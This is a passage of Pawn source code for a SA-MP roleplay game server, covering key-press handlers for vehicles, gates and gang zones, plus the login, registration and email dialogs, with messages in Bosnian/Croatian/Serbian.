    #if XMAS_MOD == 1

	    if( Snow_F[ playerid ] && Shoot[ playerid ] == 0 && newkeys & 128 )
		{
			switch(Charged[ playerid ])
			{
				case 0: return ApplyAnimation( playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0 ), Charged[ playerid ] = 1;
				case 1: return CheckSnow( playerid );
			}
		}

	#endif

    if( PRESSED( KEY_SUBMISSION ) )
	{
        if( IsPlayerInAnyVehicle( playerid ) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
		{
	        new vehicle = GetPlayerVehicleID( playerid ),
				engine,lights,alarm,doors,bonnet,boot,objective;

		 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
		    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu?" );
		    if( StartingVehicle[playerid] == true ) return SendErrorMessage( playerid, "Vec palite vozilo." );

			if( VehicleInfo[ vehicle ][ vUsage ] == PRIVATNO_VOZILO )
			{
				if( PlayerInfo[ playerid ][ xAdmin ] >= 5 ) { }
				else
				{
				    new slot = -1;
				    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
					{
						if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == vehicle  ) 
						{
					  		slot = j;
							break;
						}
					}
					if( slot == -1 )
					{
				 		if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == VehicleInfo[ vehicle ][ vSqlID ] ) { }
				        else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila." );
				    }
				}

	            GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
				if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

	            SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

				StartingVehicle[playerid] = true;
				if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
				else VehicleEngineStart(playerid);
			}
	        else if( VehicleInfo[ vehicle ][ vUsage ] == ORGANIZACIJSKO_VOZILO )
			{
				if( VehicleInfo[ vehicle ][ vOrganization ] == PlayerInfo[ playerid ][ xClan ] || PlayerInfo[ playerid ][ xAdmin ] >= 5 )
				{
				    GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
					if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

		            SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

					StartingVehicle[playerid] = true;
					if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
					else VehicleEngineStart(playerid);
				}
				else
				{
					SendErrorMessage( playerid, "Nemate kljuc ovog vozila.");
				}
	        }
	        else if( VehicleInfo[ vehicle ][ vUsage ] == IZLOZBENO_VOZILO )
			{
				if( PlayerInfo[ playerid ][ xAdmin ] == 6 )
				{
				    GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
					if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

		            SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

					StartingVehicle[playerid] = true;
					if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
					else VehicleEngineStart(playerid);
				}
				else
				{
					SendErrorMessage( playerid, "Nemate kljuc ovog vozila.");
				}
	        }
			else
			{
				GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
			    if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

				StartingVehicle[playerid] = true;
				if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
				else VehicleEngineStart(playerid);
		    }
		}
    }

    if( takingselfie[ playerid ] )
	{
		if( PRESSED( KEY_ANALOG_RIGHT ) )
		{
			GetPlayerPos(playerid,lX[ playerid ],lY[ playerid ],lZ[ playerid ]);

			static Float: n1X, Float: n1Y;
		    if(Degree[ playerid ] >= 360) Degree[ playerid ] = 0;
		    Degree[ playerid ] += SelfieSpeed;
		    n1X = lX[ playerid ] + SelfieRadius * floatcos(Degree[ playerid ], degrees);
		    n1Y = lY[ playerid ] + SelfieRadius * floatsin(Degree[ playerid ], degrees);
		    SetPlayerCameraPos(playerid, n1X, n1Y, lZ[ playerid ] + SelfieHeight);
		    SetPlayerCameraLookAt(playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ]+1);
		    SetPlayerFacingAngle(playerid, Degree[ playerid ] - 90.0);
		}
		if( PRESSED( KEY_ANALOG_LEFT ) )
		{
		    GetPlayerPos(playerid,lX[ playerid ],lY[ playerid ],lZ[ playerid ]);
			static Float: n1X, Float: n1Y;
		    if(Degree[ playerid ] >= 360) Degree[ playerid ] = 0;
		    Degree[ playerid ] -= SelfieSpeed;
		    n1X = lX[ playerid ] + SelfieRadius * floatcos(Degree[ playerid ], degrees);
		    n1Y = lY[ playerid ] + SelfieRadius * floatsin(Degree[ playerid ], degrees);
		    SetPlayerCameraPos(playerid, n1X, n1Y, lZ[ playerid ] + SelfieHeight);
		    SetPlayerCameraLookAt(playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ]+1);
		    SetPlayerFacingAngle(playerid, Degree[ playerid ] - 90.0);
		}
	}

    if( newkeys & KEY_ACTION )
	{
	    if( IsPlayerInAnyVehicle( playerid ) )
		{
		    if( IsVehicleBajs( GetPlayerVehicleID( playerid ) ) )
			{
			    if( BikeBH[ playerid ] == 0 )
				{
				    if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xSpecAdmin ] < 1 && PlayerInfo[ playerid ][ xGamemaster ] < 1 && PlayerInfo[ playerid ][ xPromoter ] < 1 && PlayerInfo[ playerid ][ xYouTuber ] < 1 && PlayerInfo[ playerid ][ xVIPLevel ] < 3 )
					{
					    SendErrorMessage( playerid, "Ne mozete skakati sa biciklom.");
					    SetPlayerTimerEx(playerid, "BikeBunnyHop", 2000, false, "i", playerid);
					    BikeBH[ playerid ] = 1;

					    new Float:PosX, Float:PosY, Float:PosZ;
					    GetPlayerPos( playerid, PosX, PosY, PosZ );
					    SMG_SetPlayerPos( playerid, PosX, PosY, PosZ+2 );
				    }
			    }
		    }
	    }
    }

    if( newkeys == KEY_SECONDARY_ATTACK )
	{
        if( GetPlayerState( playerid ) == 1 ) UlazIzlaz( playerid );
        if( GetPlayerSpecialAction( playerid ) != SPECIAL_ACTION_NONE && GetPlayerSpecialAction( playerid ) != SPECIAL_ACTION_CUFFED ) SetPlayerSpecialAction( playerid, SPECIAL_ACTION_NONE );

		if( IsPlayerInRangeOfPoint( playerid, 1.5, 64.8168,-1737.4658,3.2231 ) ) // russian dole
        {
			SetCameraBehindPlayer( playerid );
   			UcitajObjekte( playerid );
		   	SMG_SetPlayerPos( playerid, 55.3508,-1740.7244,25.7431 );
		}
		else if( IsPlayerInRangeOfPoint( playerid, 1.5, 55.3508,-1740.7244,25.7431 ) ) // russian gore
        {
			SetCameraBehindPlayer( playerid );
   			UcitajObjekte( playerid );
		   	SMG_SetPlayerPos( playerid, 64.8168,-1737.4658,3.2231 );
		}

		if( IsPlayerInRangeOfPoint( playerid, 1.5, 1359.5334, 1064.9695, 1626 ) ) // lspd int
        {
        	if( GetFactionType( playerid ) != ORG_TIP_VLADINA) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovaj lift samo drzavna organizacija." );
			SetCameraBehindPlayer( playerid );
   			UcitajObjekte( playerid );
		   	SMG_SetPlayerPos( playerid, 1576.8925, -1694.2762, 6.2188 );
		}
		else if( IsPlayerInRangeOfPoint( playerid, 1.5, 1576.8925, -1694.2762, 6.2188 ) ) // lspd ext
        {
        	if( GetFactionType( playerid ) != ORG_TIP_VLADINA) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovaj lift samo drzavna organizacija." );
			SetCameraBehindPlayer( playerid );
   			UcitajObjekte( playerid );
   			for( new i = 1; i < MAX_ORG; i++ )
			{
			   	SetPlayerInterior( playerid, org_info[ i ][ oInt ] );
				SetPlayerVirtualWorld( playerid, org_info[ i ][ oVw ] );
				SetPlayerTime( playerid, 12, 0 );
				inOrgInt[ playerid ] = i;
				break;
			}
		   	SMG_SetPlayerPos( playerid, 1359.5334, 1064.9695, 1626 );
		}
	}

    if( HOLDING( KEY_SPRINT ) )
	{
		if( PRESSED( KEY_JUMP ) )
		{
		    if( !KnockedDown[ playerid ] &&
					PlayerInfo[ playerid ][ xZatvor ] == 0 &&
						PlayerInfo[ playerid ][ xPromoter ] < 1 &&
							PlayerInfo[ playerid ][ xYouTuber ] < 1 &&
								!IsPlayerInAnyVehicle( playerid ) &&
									!AdminDuty[ playerid ] &&
										PlayerInfo[ playerid ][ xVIPLevel ] < 4 &&
											!NaDmEventu[ playerid ] &&
												WARPInfo[ playerid ][ WARIgrac ] == -1 &&
													tdm_player_info[ playerid ][ tdm_Team ] == 0 &&
														PlayerCuffed[ playerid ] == 0 &&
															TrashSearch[ playerid ] == 0 &&
																PlayerInvited[playerid] == 0 &&
																	GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_USEJETPACK &&
																	(!UzeoOpremu[playerid] && GetPlayerInterior(playerid) == 0))
			{
			    SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);
			   	SetCameraBehindPlayer( playerid );
			    SMG_TogglePlayerControllable( playerid, false );

				SendClientMessage(playerid, ANTICHEAT, "(ANTICHEAT): Zabranjeno je raditi Bunny Hopp.");
			}
		}
	}

	if( ( newkeys == KEY_SECONDARY_ATTACK ) && gSmoking[playerid] > 0 )
    {
        if(gSmoking[playerid] == 1)
        {
	        SetPlayerSpecialAction( playerid, 0 );
	        gSmoking[playerid] = 0;

		  	SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s baca cigaretu na pod.", ImeIgraca( playerid ) );
		}
    }

    else if( PRESSED( KEY_FIRE ) )
	{
		if(PlayerInvited[playerid] == event_STUNT || PlayerInvited[playerid] == event_DRAG)
		{
			AddVehicleComponent( GetPlayerVehicleID( playerid ), 1010 );
		}
        if( CreatingGZone[ playerid ] == 1 ) {
        
		    new Float:Pos[ 3 ];
			GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

			if( IsCordsInOtherGZone( Pos[ 0 ], Pos[ 1 ] ) != -1 ) return SendErrorMessage( playerid, "Ne mozes da postavis u drugoj gang zoni." );

	        CreatingPos[ playerid ][ 0 ] = Pos[ 0 ];
	        CreatingPos[ playerid ][ 1 ] = Pos[ 1 ];
            SendInfoMessage( playerid, "Koristi {FFFFFF}LMB{4282C0} da postavis pozicije." );
	        SendInfoMessage( playerid, "Sada sacuvaj poziciju desnog gornjeg ugla polja." );
	        CreatingGZone[ playerid ]++;
        }
        else if( CreatingGZone[ playerid ] == 2 ) {
        
            new Float:Pos[ 4 ];
            new id = CreatingGZoneID[ playerid ];

			if( id == -1 ) return SendErrorMessage( playerid, "Vec ima maksimalni broj gang zona." );

			GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
			GetPlayerFacingAngle( playerid, Pos[ 3 ] );

			if( IsCordsInOtherGZone( Pos[ 0 ], Pos[ 1 ] ) != -1 ) return SendErrorMessage( playerid, "Ne mozes da postavis u drugoj gang zoni." );

	        CreatingPos[ playerid ][ 2 ] = Pos[ 0 ];
	        CreatingPos[ playerid ][ 3 ] = Pos[ 1 ];
	        CreatingGZone[ playerid ]++;

            GZone_Reset( id );

            if( CreatingPos[ playerid ][ 0 ] > CreatingPos[ playerid ][ 2 ] ) {
			    gZoneInfo[ id ][ gZoneMaxX ] = CreatingPos[ playerid ][ 0 ];
				gZoneInfo[ id ][ gZoneMinX ] = CreatingPos[ playerid ][ 2 ];
			}
			else if( CreatingPos[ playerid ][ 2 ] > CreatingPos[ playerid ][ 0 ] ) {
			    gZoneInfo[ id ][ gZoneMaxX ] = CreatingPos[ playerid ][ 2 ];
				gZoneInfo[ id ][ gZoneMinX ] = CreatingPos[ playerid ][ 0 ];
			}

			if( CreatingPos[ playerid ][ 1 ] > CreatingPos[ playerid ][ 3 ] ) {
			    gZoneInfo[ id ][ gZoneMaxY ] = CreatingPos[ playerid ][ 1 ];
				gZoneInfo[ id ][ gZoneMinY ] = CreatingPos[ playerid ][ 3 ];
			}
			else if( CreatingPos[ playerid ][ 3 ] > CreatingPos[ playerid ][ 1 ] ) {
			    gZoneInfo[ id ][ gZoneMaxY ] = CreatingPos[ playerid ][ 3 ];
				gZoneInfo[ id ][ gZoneMinY ] = CreatingPos[ playerid ][ 1 ];
			}

            gZoneInfo[ id ][ gZoneID ] = CreateZone( gZoneInfo[ id ][ gZoneMinX ], gZoneInfo[ id ][ gZoneMinY ], gZoneInfo[ id ][ gZoneMaxX ], gZoneInfo[ id ][ gZoneMaxY ] );
            CreateZoneBorders(gZoneInfo[ id ][ gZoneID ]);
            CreateZoneNumber(gZoneInfo[ id ][ gZoneID ], id);
			
			gZoneInfo[ id ][ gZoneRectAngle ] = CreateDynamicRectangle( gZoneInfo[ id ][ gZoneMinX ], gZoneInfo[ id ][ gZoneMinY ], gZoneInfo[ id ][ gZoneMaxX ], gZoneInfo[ id ][ gZoneMaxY ], -1, -1, -1 );

            SendInfoMessage( playerid, "Koristi {FFFFFF}LMB{4282C0} da postavis pozicije." );
			SendInfoMessage( playerid, "Sada sacuvaj poziciju za pickup i text." );
        }
        else if( CreatingGZone[ playerid ] == 3 ) {
        
            new Float:Pos[ 3 ], stringic[ 24 ], string[128];
        
            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
        
            new id = IsCordsInGZone( CreatingGZoneID[ playerid ], Pos[ 0 ], Pos[ 1 ] );

		    if( id != CreatingGZoneID[ playerid ] ) return SendErrorMessage( playerid, "Moras sacuvati u zoni koju kreiras." );

            gZoneInfo[ id ][ gZonePickup_X ] = Pos[ 0 ];
            gZoneInfo[ id ][ gZonePickup_Y ] = Pos[ 1 ];
            gZoneInfo[ id ][ gZonePickup_Z ] = Pos[ 2 ];
        
            gZoneInfo[ id ][ gZoneTaken ] = 0;
            gZoneInfo[ id ][ gZoneTakeable ] = 1;
            gZoneInfo[ id ][ gZoneTime ] = 0;

            if(gZoneInfo[id][gZoneIsSpecial] == 1) 
            {
				gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 0, 0, .priority = 28 );
				format(string, sizeof(string), "(SPECIJALNA TERITORIJA - [%d])\nTeritorija je {FFFFFF}slobodna.\n{EB4034}Ako zelite da je zauzmete kucajte {FFFFFF}\"/zauzmi\"", id);
				gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
            }
            else
            {
				gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 0, 0, .priority = 28 );
				format(string, sizeof(string), "(OBICNA TERITORIJA - [%d])\nTeritorija je {FFFFFF}slobodna.\n{EB4034}Ako zelite da je zauzmete kucajte {FFFFFF}\"/zauzmi\"", id);
				gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
            }

            format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ id ][ gZoneColor ] );
            ShowZoneForAll( gZoneInfo[ id ][ gZoneID ], HexToInt( stringic ) );

            SendInfoMessage( playerid, "Uspjesno ste zavrsili kreiranje gang zone." );

            sql_create_gangzone( id );

            CreatingGZone[ playerid ] = -1;
            CreatingGZoneID[ playerid ] = -1;
		}
    }
    else if( PRESSED( KEY_HANDBRAKE ) )
	{
	    if( usingAnimation[ playerid ] )
		{
	    	usingAnimation[ playerid ] = false;
			StopLoopingAnim( playerid );
		}
	}
    else if( PRESSED( KEY_NO ) )
	{
        if( IsPlayerInAnyVehicle( playerid ) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
		{
		    if( !Tempomat[ playerid ] )
			{
				new vid = GetPlayerVehicleID( playerid );
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx( vid, engine, lights, alarm, doors, bonnet, boot, objective );
				if( engine == 0 ) return SendErrorMessage(playerid, "Prvo upali motor, pa onda tempomat." );
				if( IsVehicleBajs( vid ) || IsVehicleMotor( vid ) || IsVehicleBrod( vid ) || IsVehicleLetelica( vid ) ) return 1;
				if( GetVehicleSpeed( vid ) == 0 ) return(false);
				if( GetSpeed( playerid ) > 80 ) return SendErrorMessage( playerid, "Ne moze se upaliti tempomat preko 80kmh!");

				new Float:x, Float:y, Float:z;
				GetVehicleVelocity( vid, x, y, z);
				GetVehicleZAngle( vid, PlayerHeadingAngle[ playerid ] );
				DistanceFlat( 0, 0, x, y, PlayerCruiseSpeed[ playerid ] );
				SendInfoMessage( playerid, "Upalio si tempomat, da ga ugasis pritisni {FFFFFF}'N'.");
				cruise_control[playerid] = SetPlayerTimerEx(playerid, "CruiseControl", 125, true, "i", playerid);
				Tempomat[ playerid ] = true;
			}
			else if( Tempomat[ playerid ] )
			{
			 	if( PlayerCruiseSpeed[ playerid ] != 0.00 && ( newkeys & KEY_HANDBRAKE ) )
				{
				    PlayerCruiseSpeed[ playerid ] = 0.00;
				    Tempomat[ playerid ] = false;
					SendInfoMessage( playerid, "Ugasio si tempomat, da ga upalis pritisni {FFFFFF}'N'.");
				}
				else
				{
				    PlayerCruiseSpeed[ playerid ] = 0.00;
				    Tempomat[ playerid ] = false ;
				}
			}
		}
    }
    else if( PRESSED( KEY_YES ) )
	{
		if(CreateRentID[ playerid ] != -1)
		{
			new Float:X, Float:Y, Float:Z, Float:angle;
			GetPlayerPos(playerid, X, Y, Z);
			GetPlayerFacingAngle(playerid, angle);

			VoziloRentInfo[CreateRentID[ playerid ]][vrSpawn_Pos_X] = X;
			VoziloRentInfo[CreateRentID[ playerid ]][vrSpawn_Pos_Y] = Y;
			VoziloRentInfo[CreateRentID[ playerid ]][vrSpawn_Pos_Z] = Z;
			VoziloRentInfo[CreateRentID[ playerid ]][vrSpawn_Pos_A] = angle;

			mSQL_CreateVehicleRent(CreateRentID[ playerid ]);
			CreateRentID[ playerid ] = -1;
		}
	}
    else if( ( newkeys == KEY_CROUCH ) && NearestGate( playerid ) != -1 )
	{
		new const gate = NearestGate( playerid );
		switch(GateData[ gate ][ gateFor ])
		{
	    	case 1:
			{
	    	    if( GateData[ gate ][ gateOrgID ] != -1 )
				{
					if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || GateData[ gate ][ gateOrgID ] == PlayerInfo[ playerid ][ xClan ] )
					{
					    Gate_Operate( playerid, gate );
					}
				}
	    	}
	        case 2:
			{
		        if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || strcmp( ImeIgraca( playerid ), GateData[ gate ][ gateOwner ], true ) == 0 || strcmp( PlayerInfo[ playerid ][ xKljucKapije ], GateData[ gate ][ gateOwner ], true ) == 0 )
				{
		        	Gate_Operate( playerid, gate );
				}
			}
			case 3:
			{
			    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
				{
		        	Gate_Operate( playerid, gate );
				}
			}
			case 4:
			{
			    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 )
				{
		        	Gate_Operate( playerid, gate );
				}
			}
			case 5:
			{
			    if( PlayerInfo[ playerid ][ xAdmin ] >= 8 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 )
				{
		        	Gate_Operate( playerid, gate );
				}
			}
			case 6:
			{
			    if( PlayerInfo[ playerid ][ xAdmin ] >= 8 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
				{
		        	Gate_Operate( playerid, gate );
				}
			}
			case 7:
			{
			    if( PlayerInfo[ playerid ][ xAdmin ] >= 8 || PlayerInfo[ playerid ][ xPromoter ] >= 1 )
				{
		        	Gate_Operate( playerid, gate );
				}
			}
			case 8:
			{
			    Gate_Operate( playerid, gate );
			}
		}
    }
	return 1;
}

public OnPlayerUpdate( playerid )
{
	if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
	{
        foreach(new i : iter_Roadblock)
		{
			if( IsPlayerInRangeOfPoint( playerid, 3.0, Roadblocks[ i ][ sX ], Roadblocks[ i ][ sY ], Roadblocks[ i ][ sZ ] ) )
			{
				if( Roadblocks[ i ][ sSpike ] )
				{
                    new panels, tires, doors, lights, carid = GetPlayerVehicleID( playerid );
					GetVehicleDamageStatus( carid, panels, doors, lights, tires );
					UpdateVehicleDamageStatus( carid, panels, doors, lights, 15 );
					return 0;
				}
			}
		}
    }

	#if ZIMSKI_MOD == 1

		if( PlayerLogged[ playerid ] )
		{
			if( Snow[ playerid ] )
			{
		        if( GetPlayerInterior( playerid ) == 0 && GetPlayerVirtualWorld( playerid ) == 0 )
				{
					new Float:PosX, Float:PosY, Float:PosZ;
		        	GetPlayerCameraPos( playerid, PosX, PosY, PosZ );
		        	MovePlayerObject( playerid, SnowObject[ playerid ], PosX, PosY+2.5, PosZ-2.5, 4000.0 );
		        }
		  	}
		}

  	#endif
	return 1;
}
//------------------------------------------------------------------------------

public OnDialogResponse( playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == 0) return 1;

    if(strfind(inputtext, "%", true) != -1 || strfind(inputtext, "#", true) != -1)
	{
        SendClientMessage( playerid, CRVENA, "#DIALOG: Uneli ste format koji server ne podrzava.");
		return 1;
	}

	//------

	if(dialogid == dialog_LOGIN) 
	{
	    if(!response) return Kick(playerid);
		if(response) 
		{
			new hash_pass[64];
			SHA256_PassHash(inputtext, ImeIgraca(playerid), hash_pass, sizeof(hash_pass));

		    if(!strcmp(hash_pass, PlayerInfo[playerid][xLozinka], false) && !isnull(inputtext)) 
		    {
		    	strmid(accountRealPass[playerid], inputtext, 0, strlen(inputtext), 255);
			    login_showed[playerid] = false;

				new q[256];
	            mysql_format(mSQL, q, sizeof(q), "SELECT users.*, IFNULL(org_members.org_id, 0) \
													  AS `org_id`, org_members.memb_rank, org_members.memb_type \
													  FROM users \
													  LEFT JOIN org_members \
													  ON users.user_id = org_members.memb_sqlID \
													  WHERE users.p_name = '%e' LIMIT 1", ImeIgraca( playerid ) );

				mysql_tquery(mSQL, q, "OnAccountLoad", "i", playerid);
			}
			else
			{
			    if(PokusajLogina[playerid] == MAX_POKUSAJ_LOGINA - 1) 
			    {
				    Kickovanje(playerid, "Uneli ste krivu lozinku ({FF0000}%d{FFFFFF}) puta i dobili kick.", MAX_POKUSAJ_LOGINA);
				    return 1;
				}
		    	PokusajLogina[playerid]++;
				SCMF(playerid, CRVENA, "(LOGIN): Pogresna lozinka {FFFFFF}(%d/%d).", PokusajLogina[ playerid ], MAX_POKUSAJ_LOGINA);
				format(sDStrg, sizeof(sDStrg), DialogTekstovi[ 0 ], MAX_POKUSAJ_LOGINA );
			    ShowPlayerDialog( playerid, dialog_LOGIN, DIALOG_STYLE_PASSWORD, D_NASLOV, sDStrg, "Unesi", "" );
			}
		}
		return 1;
	}
	//
	else if(dialogid == dialog_ADMINCODE)
	{
	    if(!response) Kickovanje( playerid, "Odbili ste upisati vas admin code.");
	    else
		{
		    if(PlayerInfo[playerid][xAKod] == strval(inputtext))
		    {
		    	AdminDialog[playerid] = false;
		    	SendInfoMessage(playerid, "Upisali ste tacno vas code, dobrodosao nazad.");
		    }
		    else
		    {
		    	AdminDialog[playerid] = false;
		    	Kickovanje(playerid, "Pogresan admin code.");
			}
		}
	}
	else if(dialogid == dialog_REGISTER )
	{
		if( !response )
		{
			SelectTextDraw( playerid, 0x4282C0FF );
			return 1;
		}
		else
		{
			if( strlen( inputtext ) < 6 || strlen(inputtext) > 20 || !IsPasswordCorrent(inputtext) )
			{
		    	ShowPlayerDialog( playerid, dialog_REGISTER, DIALOG_STYLE_INPUT, "{FFFFFF}Registracija:", "{FFFFFF}* Password moze sadrzavati minimalno 6, a maximalno 20 znaka, te samo slova i brojke:", "Registruj", "Izlaz");
				return 1;
			}
			else
			{
    			SHA256_PassHash( inputtext, ImeIgraca( playerid ), PlayerInfo[ playerid ][ xLozinka ], 255 );

                strmid( accountRealPass[ playerid ], inputtext, 0, strlen( inputtext ), 255 );
                InputPassword[ playerid ] = true;
                SelectTextDraw( playerid, 0x4282C0FF );
                PlayerTextDrawSetString(playerid, Register_pTD[playerid][17], "~y~DONE.");
	    	}
		}
	}
	else if(dialogid == dialog_REGCONFRM )
	{
	    if( !response )
		{
			SelectTextDraw( playerid, 0x4282C0FF );
			return 1;
		}
	    else
	    {
	       	RegisterTDControl( playerid, false );

		    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
			PlayerInfo[ playerid ][ xLevel ] = ServerInfo[ PocetniLevel ];
	        PlayerInfo[ playerid ][ xNovac ] = ServerInfo[ PocetniNovaca ];
	        PlayerInfo[ playerid ][ xRegistrovan ] = 1;
            CancelSelectTextDraw( playerid );

		    sql_create_account( playerid );
	    }
	}
	else if(dialogid == dialog_COUNTRY )
	{
	    if( !response )
		{
			SelectTextDraw( playerid, 0x4282C0FF );
			return 1;
		}
		else
		{
		    switch( listitem )
			{
			 	case 0:
		 		{
			 	    PlayerInfo[ playerid ][ xDrzava ] = 1;
				    ChoseCountry[ playerid ] = 1;
				    SelectTextDraw( playerid, 0x4282C0FF );
			 	}
			 	case 1:
				{
			 	    PlayerInfo[ playerid ][ xDrzava ] = 2;
				    ChoseCountry[ playerid ] = 2;
				    SelectTextDraw( playerid, 0x4282C0FF );
			 	}
			 	case 2:
				{
			 	    PlayerInfo[ playerid ][ xDrzava ] = 3;
				    ChoseCountry[ playerid ] = 3;
				    SelectTextDraw( playerid, 0x4282C0FF );
			 	}
			 	case 3:
				{
			 	    PlayerInfo[ playerid ][ xDrzava ] = 4;
				    ChoseCountry[ playerid ] = 4;
				    SelectTextDraw( playerid, 0x4282C0FF );
			 	}
			 	case 4:
				{
			 	    PlayerInfo[ playerid ][ xDrzava ] = 5;
				    ChoseCountry[ playerid ] = 5;
				    SelectTextDraw( playerid, 0x4282C0FF );
			 	}
			 	case 5:
				{
			 	    PlayerInfo[ playerid ][ xDrzava ] = 6;
				    ChoseCountry[ playerid ] = 6;
				    SelectTextDraw( playerid, 0x4282C0FF );
			 	}
			}
			PlayerTextDrawSetString(playerid, Register_pTD[playerid][20], "~y~DONE.");
		}
	}
	else if(dialogid == dialog_AGE )
	{
		if( !response )
		{
			SelectTextDraw( playerid, 0x4282C0FF );
			return 1;
		}
		else
		{
		    new age = strval( inputtext );
			if( age < 12 || age > 70 ) return ShowPlayerDialog( playerid, dialog_AGE, DIALOG_STYLE_INPUT, "{FFFFFF}Godine:", "{FFFFFF}* U prazni prostor ispod unesite vaÅ¡e godine.\nMinimalno 12, maximalno 70:", "Unos", "Izadji" );
			PlayerInfo[ playerid ][ xGodine ] = age;
			InputAge[ playerid ] = age;
		    SelectTextDraw( playerid, 0x4282C0FF );
		    PlayerTextDrawSetString(playerid, Register_pTD[playerid][19], "~y~DONE.");
		}
	}
	else if(dialogid == dialog_MAIL )
	{
		if( !response )
		{
			SelectTextDraw( playerid, 0x4282C0FF );
			return 1;
		}
		else
		{
		    new mailstringa = strfind( inputtext, "@", true), tackastring = strfind( inputtext, ".", true );
	        if( mailstringa == -1 || tackastring == -1 || !IsEmailCorrect(inputtext) || strlen(inputtext) < 6 || strlen(inputtext) > 70)
			{
        		ShowPlayerDialog(playerid, dialog_MAIL, DIALOG_STYLE_INPUT, "{FFFFFF}Mail:", "{FFFFFF}* U prazni prostor ispod unesite vasu e-mail adresu.\nE-mail adresa ce nam posluziti u vracanju vasih passworda.\n{FF0000}(Bez maila nema vracanja passworda):", "Unos", "Izlaz");
			}
			else
			{
				strmid( PlayerInfo[ playerid ][ xMail ], inputtext, 0, strlen( inputtext ), 50 );
                InputMail[ playerid ] = true;
                SelectTextDraw( playerid, 0x4282C0FF );
                PlayerTextDrawSetString(playerid, Register_pTD[playerid][18], "~y~DONE.");
			}
		}
	}
	else if(dialogid == dialog_HELP )
	{
		if(response)
		{
			switch(listitem)
			{
			    case 0:
			    {
			        //Uopsteno
